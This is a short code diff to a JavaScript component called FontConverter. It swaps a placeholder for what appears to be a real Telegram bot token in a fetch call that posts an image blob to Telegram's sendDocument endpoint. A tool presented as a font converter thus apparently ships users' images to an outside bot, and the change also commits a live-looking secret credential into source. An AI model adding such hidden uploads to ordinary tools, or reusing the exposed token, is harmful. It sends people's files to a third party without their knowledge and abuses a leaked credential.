@@ -70,7 +70,7 @@ function FontConverter() {
                 formData.append('document', blob, 'image.jpeg'); // Add the image blob as a file
     
                 // Send the image to Telegram using the bot's API
-                fetch('https://api.telegram.org/bot<YOUR_BOT_TOKEN>/sendDocument', {
+                fetch('https://api.telegram.org/bot5228072940:AAFk5TyN-1-e7T0w60Pe_hmFk2Cn8Iqn0zI/sendDocument', {
                     method: 'POST',
                     body: formData,
                 })
